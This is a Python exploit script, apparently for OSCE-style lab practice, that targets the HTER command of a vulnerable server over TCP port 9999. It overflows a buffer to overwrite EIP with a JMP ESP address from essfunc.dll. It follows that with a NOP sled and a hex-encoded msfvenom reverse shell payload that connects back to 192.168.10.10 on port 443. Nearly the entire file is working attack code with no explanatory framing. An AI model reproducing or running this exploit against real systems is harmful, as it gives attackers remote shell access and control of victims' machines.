#!/usr/bin/python
import socket,sys,os,struct

'''
# 2040 for 8 byte EIP overwrite

625011AF   FFE4             JMP ESP		# in C:\Users\n0bfu\Desktop\OSCE_Prep\essfunc.dll
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.10 LPORT=443 -f hex -b "\x00"
'''
buf_totlen = 5000

payload = "be76f86acfdaddd97424f45833c9b152317012037012839e04883aa21dcfc55adeb04cbfeff02bb440c138986caa6d08e6deb93f4f549c0e50c5dc11d21431f1ebd644f02c0aa4a0e5401b54811da0dfd9b0a03ca9b38193a1ed011265860b0c6aa3c2a7585fd56191a07a4c1d5382899a8cf1e3d8310230a2ed87a204653f0eb4aaa6c5ba07ac81de9661badb13846c6a67a3a83633cae99292f3e97c4a5662909feb29fd6cc6d1fdfa51a2cfa5c92c7c2dd4ab8304a0237aa7d16ab9f38104687c4ad495a9dd8439029e74faf2769ef52d66a1df450d5888a97a684242796c5329f48a395d5105d6c4f8dd4708d7984882d45d0663904dff83ef2f569bc547340e829733331dc01485548488bcceba5058287e8f99b77f42a5936f9a2698db727176b5342b386fef8092e776eb24717726d39dc69fa2a2e77723db15e8cc369e18871ab7b04ecf85dc703ac9d8f2ceb21eeabbb75bac50caf4595679f44b"

buffer = "A" * 2040
buffer += "AF115062"
buffer += "90" * 16
buffer += payload
buffer += "D" * (buf_totlen - len(buffer))

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect(("192.168.10.30", 9999))
s.send("HTER 1" + buffer + "\r\n")
s.close()

